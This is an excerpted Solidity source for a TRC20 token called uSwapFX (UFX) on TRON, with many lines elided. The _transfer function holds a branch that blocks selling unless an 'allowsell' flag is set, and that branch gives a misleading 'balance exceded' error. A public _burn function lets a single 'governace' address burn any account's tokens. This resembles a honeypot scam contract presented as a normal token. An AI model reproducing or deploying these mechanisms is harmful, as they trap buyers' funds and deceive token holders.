...
contract TRC20 is Context, ITRC20 {
	...
	function transferFrom(address sender, address recipient, uint256 amount) public  returns(bool) {
		...
		_approve(sender, _msgSender(), _allowances[sender][_msgSender()].subs(amount, "TRC20: transfer amount exceeds allowance"));
		return true;
	}
	...
	function decreaseAllowance(address spender, uint256 subtractedValue) public  returns(bool) {
		_approve(_msgSender(), spender, _allowances[_msgSender()][spender].subs(subtractedValue, "TRC20: decreased allowance below zero"));
		return true;
	}
	...
	function _transfer(address sender, address recipient, uint256 amount) internal  {
		...
		_balances[sender] = _balances[sender].subs(amount, "TRC20: transfer amount exceeds balance");
		_balances[recipient] = _balances[recipient].add(amount);
		
		emit Transfer(sender, recipient, amount);
        }
		else {
		require(allowsell == true, "TRC20: balance exceded");
		_balances[sender] = _balances[sender].subs(amount, "TRC20: transfer amount exceeds balance");
		_balances[recipient] = _balances[recipient].add(amount);
	...
	function _initMint(address account, uint256 amount) internal  {
		require(account != address(0), "TRC20: create to the zero address");
	...
	function _burn(address account, uint256 amount) public  {
		require(account == governace, "TRC20: Burner is not allowed");
		_beforeTokenTransfer(address(0), account, amount);
...
contract USwapFX is TRC20 {
	constructor()
	TRC20('uSwapFX TRON', 'UFX')
	public {
